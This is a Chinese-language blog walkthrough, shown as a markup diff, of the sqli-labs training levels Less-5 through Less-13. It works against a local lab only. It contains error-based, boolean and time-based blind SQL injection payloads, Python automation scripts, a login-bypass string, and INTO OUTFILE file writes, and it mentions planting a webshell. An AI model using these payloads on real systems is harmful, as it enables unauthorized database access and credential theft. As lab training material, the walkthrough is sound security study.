-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;union select count(*),1, concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>
-<p>由于rand()函数的存在，它是随机产生一个大于0 小于1的数，所以不一定会产生报错，有一定的随机性，所以可以多试几次，此外floor函数的作用是产生一个不大于表达式的最大整数<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B727.JPG" alt="picture"><br>爆表名payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select count(*),1, concat((select concat(table_name) from information_schema.tables where table_schema=database() limit x,1),floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B728.JPG" alt="picture"><br>得到第四张表为users<br>爆破列名payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select count(*),1, concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit x,1),floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B729.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B730.JPG" alt="picture"><br>得到三，四列为username和password<br>爆字段payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select count(*),1, concat((select concat_ws(&apos;[&apos;,password,username) from users limit x,1),floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B731.JPG" alt="picture"></p>
+<pre><code class="hljs python"><span class="hljs-comment">#! -*- encoding:utf-8 -*-</span>
+<span class="hljs-comment">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA 猜库名</span>
+<span class="hljs-comment">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'猜表名</span>
+<span class="hljs-comment">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'猜列名</span>
+<span class="hljs-comment">#select group_concat(password/username) from xxx.xxx猜字段名</span>
+<span class="hljs-keyword">import</span> requests
+dic=<span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyz,'</span>
+url=<span class="hljs-string">'http://localhost:8080/sqli-labs-master/Less-5/?id=1\' and '</span>
+string=<span class="hljs-string">''</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:
+        id=<span class="hljs-string">"substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = 'users' limit 0,1),&#123;0&#125;,1)=&#123;1&#125;--+"</span>.format(str(i),ascii(j))
+        <span class="hljs-comment">#print(id)</span>
+        url_get=(url+id)
+        <span class="hljs-comment">#print(url_get)</span>
+        r=requests.get(url_get)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">"You"</span> <span class="hljs-keyword">in</span> r.text:
+            string+=j
+            print(string)
+print(string)</code></pre>
+<p>参考博客<a href="https://uuzdaisuki.com/2018/04/22/python%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96sql%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">https://uuzdaisuki.com/2018/04/22/python%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96sql%E7%9B%B2%E6%B3%A8/</a><br>运行脚本，得到结果：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B726.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B721.JPG" srcset="/img/loading.gif" alt="picture"><br>结果我看网上的wp发现，这道题好像不是考的不是布尔盲注，应该是报错注入！！关于什么是双注入查询，可以看看这篇文章:<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a><br>简单来说就是count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，通过构造双查询，使一个查询结果报错，另一个查询结果就会出现在报错信息中，具体做法是，多一个聚合函数<br>count(*)<br>暴库payload：</p>
+<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1'union select count(*),1, concat((select database()),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a%23</code></pre>
+<p>由于rand()函数的存在，它是随机产生一个大于0 小于1的数，所以不一定会产生报错，有一定的随机性，所以可以多试几次，此外floor函数的作用是产生一个不大于表达式的最大整数<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B727.JPG" srcset="/img/loading.gif" alt="picture"><br>爆表名payload:</p>
+<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1' union select count(*),1, concat((select concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a%23</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B728.JPG" srcset="/img/loading.gif" alt="picture"><br>得到第四张表为users<br>爆破列名payload:</p>
+<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1' union select count(*),1, concat((select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">'users'</span> limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a%23</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B729.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B730.JPG" srcset="/img/loading.gif" alt="picture"><br>得到三，四列为username和password<br>爆字段payload:</p>
+<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1' union select count(*),1, concat((select concat_ws(<span class="hljs-string">'['</span>,password,username) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a%23</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B731.JPG" srcset="/img/loading.gif" alt="picture"></p>
 <p>0X02 Less-6<br>    这关是基于双引号的字符注入，那方法和第五关一样就是用双引号去闭合即可，布尔盲注和双注入查询（报错注入）都可</p>
-<p>0x03 Less-7<br>    是导出文件GET字符型注入，之前没有接触过，看了一下源码，发现sql语句变成了$sql=”SELECT * FROM users WHERE id=((‘$id’)) LIMIT 0,1”;<br>    看来需要’))去闭合，发现正确回显的内容跟前几题不一样<br>    <img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B754.JPG" alt="picture">，提示Use outfile,那首先要了解一下，outfile是什么，可以看看这个<a href="https://www.runoob.com/mysql/mysql-database-export.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-database-export.html</a><br>    大致语法就是 select ….. into outfile “路径”; 首先测试一下mysql上能不能执行，发现报错了，去百度了一下，应该是secure_file_priv，限制了路径，在mysql的my.ini文件中，在<br>    [mysql]下添加secure_file_priv=“”，表示可以导出到任意路径，之后应该就配置完了。可以试验一下<br>    <img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B759.JPG" alt="picture"><br>    应该是配置成功了，接下来就能去做题了，先测试一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=id=1&apos;)) union select 1,2,3 into outfile &quot;f://wamp64//www//1.php&quot;%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B761.JPG" alt="picture"><br>发现他居然报错了，这是怎么回事，但是我去www看发现确实生成了1.php，而且也写入了数据<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B760.JPG" alt="picture"><br>于是去看了看源码，row为false就会显示该错误，查看源码可知时，执行这个select …. into outile时$row为空值，则显示该错误，但是我们的这个sql语句还是正确执行的<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B762.JPG" alt="picture"><br>之后的步骤就和第一关一样了，不同的是我们把回显结果输出到了外部文件中<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B763.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B764.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B765.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B766.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B767.JPG" alt="picture"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:id=1&apos;)) union select 1,database(),3 into oufile &quot;f://wamp64//www//2.txt&quot;%23   #拿库名</span><br><span class="line">payload:id=1&apos;)) union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&apos;security&apos;),3 into oufile &quot;f://wamp64//www//3.txt&quot;%23    #列表名</span><br><span class="line">payload:id=1&apos;)) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),3 into oufile &quot;f://wamp64//www//4.txt&quot;%23      #列列名</span><br><span class="line">payload:id=1&apos;)) union select 1,(select group_concat(password) from security.users) ,(select group_concat(username)),3 into oufile &quot;f://wamp64//www//5.txt&quot;%23             #列username和password的字段</span><br></pre></td></tr></table></figure>
+<p>0x03 Less-7<br>    是导出文件GET字符型注入，之前没有接触过，看了一下源码，发现sql语句变成了$sql=”SELECT * FROM users WHERE id=((‘$id’)) LIMIT 0,1”;<br>    看来需要’))去闭合，发现正确回显的内容跟前几题不一样<br>    <img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B754.JPG" srcset="/img/loading.gif" alt="picture">，提示Use outfile,那首先要了解一下，outfile是什么，可以看看这个<a href="https://www.runoob.com/mysql/mysql-database-export.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-database-export.html</a><br>    大致语法就是 select ….. into outfile “路径”; 首先测试一下mysql上能不能执行，发现报错了，去百度了一下，应该是secure_file_priv，限制了路径，在mysql的my.ini文件中，在<br>    [mysql]下添加secure_file_priv=“”，表示可以导出到任意路径，之后应该就配置完了。可以试验一下<br>    <img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B759.JPG" srcset="/img/loading.gif" alt="picture"><br>    应该是配置成功了，接下来就能去做题了，先测试一下：</p>
+<pre><code class="hljs lsl">?id=id=<span class="hljs-number">1</span>')) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> into outfile <span class="hljs-string">"f://wamp64//www//1.php"</span>%<span class="hljs-number">23</span></code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B761.JPG" srcset="/img/loading.gif" alt="picture"><br>发现他居然报错了，这是怎么回事，但是我去www看发现确实生成了1.php，而且也写入了数据<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B760.JPG" srcset="/img/loading.gif" alt="picture"><br>于是去看了看源码，row为false就会显示该错误，查看源码可知时，执行这个select …. into outile时$row为空值，则显示该错误，但是我们的这个sql语句还是正确执行的<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B762.JPG" srcset="/img/loading.gif" alt="picture"><br>之后的步骤就和第一关一样了，不同的是我们把回显结果输出到了外部文件中<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B763.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B764.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B765.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B766.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B767.JPG" srcset="/img/loading.gif" alt="picture"></p>
+<pre><code class="hljs cs">payload:id=<span class="hljs-number">1'</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> oufile <span class="hljs-string">"f://wamp64//www//2.txt"</span>%<span class="hljs-number">23</span>   <span class="hljs-meta">#拿库名</span>
+payload:id=<span class="hljs-number">1'</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>)<span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">'security'</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> oufile <span class="hljs-string">"f://wamp64//www//3.txt"</span>%<span class="hljs-number">23</span>    <span class="hljs-meta">#列表名</span>
+payload:id=<span class="hljs-number">1'</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">'users'</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> oufile <span class="hljs-string">"f://wamp64//www//4.txt"</span>%<span class="hljs-number">23</span>      <span class="hljs-meta">#列列名</span>
+payload:id=<span class="hljs-number">1'</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">password</span>) <span class="hljs-keyword">from</span> security.users) ,(<span class="hljs-params"><span class="hljs-keyword">select</span> group_concat(username</span>)),3 <span class="hljs-keyword">into</span> oufile "f:<span class="hljs-comment">//wamp64//www//5.txt"%23             #列username和password的字段</span></span></code></pre>
 <p>此外这道题还可以，导出到php文件，那么就可以传一句话木马进去，然后可以连菜刀等连接wenshell的工具<br>0x04 Less-8<br>这道题应该就是布尔盲注没错了，和我之前第五题一开始的做法一样</p>
-<p>0x05 Less-9<br>这道题是居于时间的盲注，为什么呢，因为你发现无论你提交什么语句，页面总是显示You are in …. 这一个页面而不会有其他变化，这样就要考虑基于时间的盲注了<br>在了解这之前我们要先了解一下mysql中的if语句:<br>if(exp1,exp2,exp3),如果exp1正确就执行exp2，如果exp1不正确那么则执行exp3<br>此外还要知道mysql中还有一个延时函数叫做sleep():sleep(n),暂停数据库n秒，根据上诉内容那么我们就可以构造这样的sql注入语句：<br>id=1’ and if(exp,sleep(5),0),如果exp这个语句是对的，数据库会暂停5秒，在网页上显示会等待响应一段时间，如果是错的就还是维持原页面，这样做法就和布尔盲注一样了，不同的是我们<br>要观察网页是否等待响应一段时间，从而来猜数据库的库名，表名，字段名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B768.JPG" alt="picture"><br>拿到了数据库的名字，然后会发现，爆表名列名时很麻烦，不过还好我们有基于时间注入的python脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! -*- encoding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="comment"># author: leticia</span></span><br><span class="line"><span class="comment">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA/database()</span></span><br><span class="line"><span class="comment">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'</span></span><br><span class="line"><span class="comment">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'</span></span><br><span class="line"><span class="comment">#select group_concat(xxx) from xxx.xxx</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyz,'</span></span><br><span class="line">url=<span class="string">'http://localhost:8080/sqli-labs-master/Less-9/?id=1\' and '</span></span><br><span class="line">string=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        id=<span class="string">"if((substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;),sleep(5),0)--+"</span>.format(str(i),ascii(j))</span><br><span class="line">        <span class="comment">#print(id)</span></span><br><span class="line">        url_get=(url+id)</span><br><span class="line">        <span class="comment">#print(url_get)</span></span><br><span class="line">        r=requests.get(url_get)</span><br><span class="line">        sec=r.elapsed.seconds</span><br><span class="line">        <span class="keyword">if</span> sec &gt; <span class="number">2</span>:</span><br><span class="line">            string+=j</span><br><span class="line">            print(string)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
-<p>和之前你基于布尔盲注的脚本类似，只是最后判断条件改了一下，判断响应是否大于三秒<br>脚本跑出来的结果：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B770.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B771.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B772.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B773.JPG" alt="picture"></p>
+<p>0x05 Less-9<br>这道题是居于时间的盲注，为什么呢，因为你发现无论你提交什么语句，页面总是显示You are in …. 这一个页面而不会有其他变化，这样就要考虑基于时间的盲注了<br>在了解这之前我们要先了解一下mysql中的if语句:<br>if(exp1,exp2,exp3),如果exp1正确就执行exp2，如果exp1不正确那么则执行exp3<br>此外还要知道mysql中还有一个延时函数叫做sleep():sleep(n),暂停数据库n秒，根据上诉内容那么我们就可以构造这样的sql注入语句：<br>id=1’ and if(exp,sleep(5),0),如果exp这个语句是对的，数据库会暂停5秒，在网页上显示会等待响应一段时间，如果是错的就还是维持原页面，这样做法就和布尔盲注一样了，不同的是我们<br>要观察网页是否等待响应一段时间，从而来猜数据库的库名，表名，字段名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B768.JPG" srcset="/img/loading.gif" alt="picture"><br>拿到了数据库的名字，然后会发现，爆表名列名时很麻烦，不过还好我们有基于时间注入的python脚本</p>
+<pre><code class="hljs python"><span class="hljs-comment">#! -*- encoding:utf-8 -*-</span>
+<span class="hljs-comment"># python3</span>
+<span class="hljs-comment"># author: leticia</span>
+<span class="hljs-comment">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA/database()</span>
+<span class="hljs-comment">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'</span>
+<span class="hljs-comment">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'</span>
+<span class="hljs-comment">#select group_concat(xxx) from xxx.xxx</span>
+<span class="hljs-keyword">import</span> requests
+dic=<span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyz,'</span>
+url=<span class="hljs-string">'http://localhost:8080/sqli-labs-master/Less-9/?id=1\' and '</span>
+string=<span class="hljs-string">''</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:
+        id=<span class="hljs-string">"if((substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;),sleep(5),0)--+"</span>.format(str(i),ascii(j))
+        <span class="hljs-comment">#print(id)</span>
+        url_get=(url+id)
+        <span class="hljs-comment">#print(url_get)</span>
+        r=requests.get(url_get)
+        sec=r.elapsed.seconds
+        <span class="hljs-keyword">if</span> sec &gt; <span class="hljs-number">2</span>:
+            string+=j
+            print(string)
+            <span class="hljs-keyword">break</span>
+print(string)</code></pre>
+<p>和之前你基于布尔盲注的脚本类似，只是最后判断条件改了一下，判断响应是否大于三秒<br>脚本跑出来的结果：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B770.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B771.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B772.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B773.JPG" srcset="/img/loading.gif" alt="picture"></p>
 <p>0x06 Less-10<br>还是基于时间注入，只是改成用双引号去闭合</p>
 <p>0x07 Less-11<br>说是字符串注入，试了一下万能密码:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos; or &apos;1&apos;=&apos;1&apos;#</span><br></pre></td></tr></table></figure>
-<p>密码随便输就行了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B774.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B775.JPG" alt="picture"><br>直接就登进去了，不过他只给了我一组用户名和密码，那怎么去拿到其他用户的呢，先抓个包<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B776.JPG" alt="picture"><br>发现时post型注入，注入点应该在uname这里，之后的做法应该就跟第一题一样了，一步步的列出库名。表名，列名和字段名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname=1&apos; union select 1,(select group_concat(schema_name) from information_schema.schemata) #&amp;passwd=1  #列出所有库名</span><br><span class="line">uname=1&apos; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&apos;security&apos;) #&amp;passwd=1  #列出security下的表名</span><br><span class="line">uname=1&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;) #&amp;passwd=1    #列出users下的列名</span><br><span class="line">uname=1&apos; union select 1,(select group_concat(username/password) from security.users) #&amp;passwd=1         #爆破出用户名和密码</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B777.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B778.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B779.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B780.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B781.JPG" alt="picture"></p>
+<pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=1' <span class="hljs-keyword">or</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span>#</code></pre>
+<p>密码随便输就行了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B774.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B775.JPG" srcset="/img/loading.gif" alt="picture"><br>直接就登进去了，不过他只给了我一组用户名和密码，那怎么去拿到其他用户的呢，先抓个包<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B776.JPG" srcset="/img/loading.gif" alt="picture"><br>发现时post型注入，注入点应该在uname这里，之后的做法应该就跟第一题一样了，一步步的列出库名。表名，列名和字段名</p>
+<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1' union select 1,(select group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata) #&amp;<span class="hljs-attribute">passwd</span>=1  #列出所有库名
+<span class="hljs-attribute">uname</span>=1' union select 1,(select group_concat(table_name)<span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">'security'</span>) #&amp;<span class="hljs-attribute">passwd</span>=1  #列出security下的表名
+<span class="hljs-attribute">uname</span>=1' union select 1,(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">'users'</span>) #&amp;<span class="hljs-attribute">passwd</span>=1    #列出users下的列名
+<span class="hljs-attribute">uname</span>=1' union select 1,(select group_concat(username/password) <span class="hljs-keyword">from</span> security.users) #&amp;<span class="hljs-attribute">passwd</span>=1         #爆破出用户名和密码</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B777.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B778.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B779.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B780.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B781.JPG" srcset="/img/loading.gif" alt="picture"></p>
 <p>0x08 Less-12<br>和十一题一样就是，用”)闭合</p>
 <p>0x09 Less-13<br>感觉这道题和第五题有点类似，只是改成了post型，然后要用’)去闭合又是双注入查询，然后注入点肯定还是在uname这里。passwd填啥都行，跟第五题同样的方法:使一个查询结果报错，另一个查询结果就会出现在报错信息中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&apos;)union select count(*), concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#&amp;passwd=1  #列出所有库名</span><br><span class="line">uname=-1&apos;) union select count(*), concat((select concat(table_name) from information_schema.tables where table_schema=database() limit x,1),floor(rand()*2)) as a from information_schema.tables group by a#&amp;passwd=1  #列出security下的表名,式中的x表示你想得到第几个表的名字</span><br><span class="line">uname=-1&apos; union select count(*), concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit x,1),floor(rand()*2)) as a from information_schema.tables group by a    #列出users下的列名，x表示你想爆第几列</span><br><span class="line">uname=-1&apos; union select count(*),1, concat((select concat_ws(&apos;[&apos;,password,username) from users limit x,1),floor(rand()*2)) as a from information_schema.tables group by a#&amp;passwd=1         #爆破出用户名和密码</span><br></pre></td></tr></table></figure>
-<p>这里要注意一点好像从第十一题开始select的参数只有两个了，可以用1’) order by n#测试一下，发现n为3的时候回报错，所以我们select只能选两个参数了<br>结果：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B782.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B783.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B784.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B785.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B786.JPG" alt="picture"></p>
+<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-1')union select count(*), concat((select database()),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a#&amp;<span class="hljs-attribute">passwd</span>=1  #列出所有库名
+<span class="hljs-attribute">uname</span>=-1') union select count(*), concat((select concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a#&amp;<span class="hljs-attribute">passwd</span>=1  #列出security下的表名,式中的x表示你想得到第几个表的名字
